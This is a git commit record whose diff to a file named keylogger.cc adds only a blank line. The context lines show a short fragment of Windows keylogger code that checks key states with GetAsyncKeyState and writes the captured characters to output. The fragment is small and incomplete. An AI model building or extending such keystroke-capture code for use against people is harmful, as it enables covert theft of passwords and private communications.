dc02fe3d79e1271ac0eebb01e40f68a06ccdaf20
Samuel Riddle <30331129+sjriddle@users.noreply.github.com>
2018-04-18 08:39:12 -0600

    Update keylogger.cc

--- keylogger.cc
+++ keylogger.cc
@@ -88,6 +88,7 @@ void StartLogging()
                                 write<<"4";
                         }
                         break;
+                            
                         case 53:
                         {
                             if(GetAsyncKeyState(0x10))
